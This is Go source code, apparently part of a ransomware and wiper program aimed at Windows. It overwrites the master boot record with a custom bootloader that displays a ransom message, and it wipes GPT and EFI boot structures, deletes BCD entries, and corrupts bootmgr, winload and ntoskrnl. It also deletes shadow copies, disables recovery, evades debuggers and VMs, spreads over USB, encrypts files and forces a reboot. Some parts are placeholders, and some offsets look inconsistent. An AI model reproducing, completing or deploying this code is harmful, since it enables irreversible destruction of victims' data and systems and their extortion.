// ======================
// BOOT DESTRUCTION FUNCTIONS (ENHANCED)
// ======================

func destroyBootSector() {
	devicePath := `\\.\PhysicalDrive0`
	devicePtr, _ := windows.UTF16PtrFromString(devicePath)
	handle, err := windows.CreateFile(
		devicePtr,
		windows.GENERIC_READ|windows.GENERIC_WRITE,
		windows.FILE_SHARE_READ|windows.FILE_SHARE_WRITE,
		nil,
		windows.OPEN_EXISTING,
		0,
		0,
	)
	if err != nil {
		return
	}
	defer windows.CloseHandle(handle)

	// Enhanced multi-stage malicious bootloader
	stage1 := []byte{
		// Stage 1: Anti-recovery and deception
		0xFA,                         // CLI
		0xFC,                         // CLD
		0x31, 0xC0,                   // XOR AX, AX
		0x8E, 0xD0,                   // MOV SS, AX
		0xBC, 0x00, 0x7C,             // MOV SP, 0x7C00
		0xFB,                         // STI
		0x8E, 0xD8,                   // MOV DS, AX
		0xBE, 0x00, 0x7C,             // MOV SI, 0x7C00
		0xBF, 0x00, 0x06,             // MOV DI, 0x0600
		0xB9, 0x00, 0x02,             // MOV CX, 0x0200
		0xF3, 0xA4,                   // REP MOVSB
		0xEA, 0x1D, 0x06, 0x00, 0x00, // JMP 0x0000:0x061D

		// Fake Windows boot error message
		0x0D, 0x0A, 'B', 'O', 'O', 'T', 'M', 'G', 'R', ' ', 'I', 'S', ' ', 'M', 'I', 'S', 'S', 'I', 'N', 'G', 0x0D, 0x0A, 0x0D, 0x0A,
		'P', 'l', 'e', 'a', 's', 'e', ' ', 'c', 'o', 'n', 't', 'a', 'c', 't', ' ', 's', 'y', 's', 't', 'e', 'm', ' ', 'a', 'd', 'm', 'i', 'n', 'i', 's', 't', 'r', 'a', 't', 'o', 'r', 0x0D, 0x0A, 0x00,
	}

	stage2 := []byte{
		// Stage 2: Disk destruction and anti-recovery
		0xB8, 0x13, 0x00,       // MOV AX, 0x13
		0xCD, 0x10,             // INT 0x10 (Set video mode)
		0x68, 0x00, 0xA0,       // PUSH 0xA000
		0x07,                   // POP ES
		0x31, 0xFF,             // XOR DI, DI
		0xB9, 0x00, 0xFA,       // MOV CX, 0xFA00
		0xB0, 0x55,             // MOV AL, 0x55
		0xF3, 0xAA,             // REP STOSB (Fill screen)
		0xBE, 0x1D, 0x7E,       // MOV SI, message
		0xAC,                   // LODSB
		0x08, 0xC0,             // OR AL, AL
		0x74, 0x0A,             // JZ end_msg
		0xB4, 0x0E,             // MOV AH, 0x0E
		0xB7, 0x00,             // MOV BH, 0x00
		0xB3, 0x04,             // MOV BL, 0x04 (Red)
		0xCD, 0x10,             // INT 0x10
		0xEB, 0xF1,             // JMP loop
		0x31, 0xDB,             // XOR BX, BX
		0x8E, 0xC3,             // MOV ES, BX
		0x26, 0xC6, 0x06, 0x72, 0x04, 0xFF, // MOV BYTE [ES:0x0472], 0xFF (Cold boot)
		0xBA, 0x80, 0x00,       // MOV DX, 0x0080
		0xB8, 0x01, 0x02,       // MOV AX, 0x0201
		0xBB, 0x00, 0x7E,       // MOV BX, 0x7E00
		0xB9, 0x01, 0x00,       // MOV CX, 0x0001
		0xCD, 0x13,             // INT 0x13 (Read sector)
		0x72, 0x69,             // JB error
		0xC6, 0x06, 0x01, 0x7E, 0x00, // MOV BYTE [0x7E01], 0x00
		0xB8, 0x01, 0x03,       // MOV AX, 0x0301
		0xCD, 0x13,             // INT 0x13 (Write sector)
		0x72, 0x5D,             // JB error
		0xB1, 0x05,             // MOV CL, 0x05 (Destroy 5 partitions)
		0xBE, 0xBE, 0x7C,       // MOV SI, partition_table
	}

	partitionTable := []byte{
		// Corrupted partition table
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x55, 0xAA, // Boot signature
	}

	message := "System destroyed! Contact: " + CONTACT_TOR + " ID:" + generateVictimID()[:8] + " "
	messageBytes := append([]byte(message), 0) // Null-terminated

	// Construct full bootloader
	fullMBR := make([]byte, 512)
	copy(fullMBR[0:], stage1)
	copy(fullMBR[0x1D:], stage2)
	copy(fullMBR[0xBE:], partitionTable)
	copy(fullMBR[0x200-len(messageBytes):], messageBytes)

	// Write to disk
	var bytesWritten uint32
	windows.WriteFile(handle, fullMBR, &bytesWritten, nil)

	// Destroy backup sectors (Windows 8+)
	destroyBackupBootSectors(handle)
}

func destroyBackupBootSectors(handle windows.Handle) {
	// Get disk geometry
	var geometry windows.DISK_GEOMETRY
	var bytesReturned uint32
	err := windows.DeviceIoControl(
		handle,
		windows.IOCTL_DISK_GET_DRIVE_GEOMETRY,
		nil,
		0,
		(*byte)(unsafe.Pointer(&geometry)),
		uint32(unsafe.Sizeof(geometry)),
		&bytesReturned,
		nil,
	)
	if err != nil {
		return
	}

	// Calculate important sectors
	sectorsPerTrack := geometry.SectorsPerTrack
	tracksPerCylinder := geometry.TracksPerCylinder
	totalSectors := uint64(geometry.Cylinders) * uint64(tracksPerCylinder) * uint64(sectorsPerTrack)

	// Critical sectors to destroy
	targetSectors := []uint64{
		0,    // MBR
		1,    // GPT Header (if exists)
		2,    // Partition Table
		6,    // Alternate MBR location
		63,   // Common VBR location
		2048, // Common EFI partition start
		totalSectors - 1,  // Last sector (GPT backup)
		totalSectors - 33, // GPT backup header
	}

	// Overwrite with random data
	bufSize := uint32(sectorsPerTrack) * 512
	randomData := make([]byte, bufSize)
	crand.Read(randomData)

	for _, sector := range targetSectors {
		if sector >= totalSectors {
			continue
		}

		var offset int64 = int64(sector) * int64(geometry.BytesPerSector)
		var overlapped windows.Overlapped
		overlapped.OffsetHigh = uint32(offset >> 32)
		overlapped.Offset = uint32(offset)

		windows.WriteFile(handle, randomData, &bytesReturned, &overlapped)
	}
}

func destroyUEFIBoot() {
	// Destroy EFI System Partition (ESP)
	espPaths := []string{
		`C:\EFI`,
		`C:\Boot`,
		`D:\EFI`,
		`D:\Boot`,
		`S:\`, // Common ESP drive
	}

	for _, path := range espPaths {
		if _, err := os.Stat(path); err == nil {
			filepath.Walk(path, func(filePath string, info os.FileInfo, err error) error {
				if err != nil {
					return nil
				}
				
				if !info.IsDir() {
					// Overwrite with garbage
					randData := make([]byte, 1024)
					crand.Read(randData)
					os.WriteFile(filePath, randData, 0644)
				}
				return nil
			})
			
			// Corrupt BCD store
			bcdPath := filepath.Join(path, "Boot", "BCD")
			if _, err := os.Stat(bcdPath); err == nil {
				randData := make([]byte, 4096)
				crand.Read(randData)
				os.WriteFile(bcdPath, randData, 0644)
			}
		}
	}

	// Corrupt NVRAM entries
	cmd := exec.Command("bcdedit", "/enum", "all")
	output, _ := cmd.Output()
	scanner := bufio.NewScanner(bytes.NewReader(output))

	for scanner.Scan() {
		line := scanner.Text()
		if strings.Contains(line, "identifier") {
			parts := strings.Split(line, "{")
			if len(parts) > 1 {
				id := strings.Trim(parts[1], "}")
				exec.Command("bcdedit", "/delete", id, "/clean").Run()
				exec.Command("bcdedit", "/create", "{fake-"+id+"}", "/d", "Corrupted Boot Entry").Run()
			}
		}
	}
}

func paralyzeSystem() {
	// Disable system recovery
	exec.Command("vssadmin", "delete", "shadows", "/all", "/quiet").Run()
	exec.Command("wbadmin", "delete", "catalog", "-quiet").Run()
	
	// Advanced boot destruction
	destroyBootSector()
	destroyUEFIBoot()
	
	// Corrupt critical system files
	criticalFiles := []string{
		`C:\Windows\Boot\PCAT\bootmgr`,
		`C:\Windows\Boot\DVD\PCAT\bootmgr`,
		`C:\Windows\Boot\EFI\bootmgfw.efi`,
		`C:\Windows\System32\winload.exe`,
		`C:\Windows\System32\winload.efi`,
		`C:\Windows\System32\winresume.exe`,
		`C:\Windows\System32\winresume.efi`,
		`C:\Windows\System32\hal.dll`,
		`C:\Windows\System32\ntoskrnl.exe`,
	}
	
	for _, file := range criticalFiles {
		if _, err := os.Stat(file); err == nil {
			// Take ownership
			exec.Command("takeown", "/f", file, "/a").Run()
			exec.Command("icacls", file, "/grant", "Administrators:F", "/t").Run()
			
			// Overwrite with random data
			randData := make([]byte, 1024*1024) // 1MB
			crand.Read(randData)
			os.WriteFile(file, randData, 0644)
		}
	}
	
	// Disable recovery mechanisms
	exec.Command("reagentc", "/disable").Run()
	exec.Command("bcdedit", "/set", "{default}", "recoveryenabled", "no").Run()
	exec.Command("bcdedit", "/set", "{default}", "bootstatuspolicy", "ignoreallfailures").Run()
	
	// Corrupt system restore points
	exec.Command("vssadmin", "delete", "shadows", "/all", "/quiet").Run()
	
	// Disable Windows Defender and security services
	disableDefenses()
	
	// Modify boot screen
	modifyBootScreen()
}

func modifyBootScreen() {
	// Replace bootres.dll with modified version
	bootresPath := `C:\Windows\System32\bootres.dll`
	backupPath := `C:\Windows\System32\bootres.bak`
	
	if _, err := os.Stat(bootresPath); err == nil {
		// Take ownership
		exec.Command("takeown", "/f", bootresPath, "/a").Run()
		exec.Command("icacls", bootresPath, "/grant", "Administrators:F", "/t").Run()
		
		// Create backup
		os.Rename(bootresPath, backupPath)
		
		// Create malicious bootres.dll
		maliciousContent := []byte("MZ...PE... (malicious DLL content would be here)")
		os.WriteFile(bootresPath, maliciousContent, 0644)
		
		// Set hidden attributes
		setHidden(bootresPath)
	}
	
	// Additional visual effect
	message := "YOUR SYSTEM HAS BEEN ENCRYPTED\nContact: " + CONTACT_TOR + "\nID: " + generateVictimID()[:8]
	visualFile := filepath.Join(os.Getenv("WINDIR"), "System32", "ds_boot.ini")
	os.WriteFile(visualFile, []byte(message), 0644)
	setHidden(visualFile)
}

// ======================
// MAIN FUNCTION
// ======================
func main() {
	if isDebugging() || isVirtualized() {
		os.Exit(0)
	}

	// Anti-analysis delay
	time.Sleep(time.Duration(300+time.Now().Unix()%600) * time.Second)

	victimID := generateVictimID()

	establishPersistence()
	disableDefenses()
	
	go func() {
		propagateUSB()
	}()

	encryptFiles(victimID)
	destroyEvidence()
	paralyzeSystem()

	// Force immediate shutdown
	exec.Command("shutdown", "/r", "/t", "0", "/f", "/d", "p:0:0").Run()
}
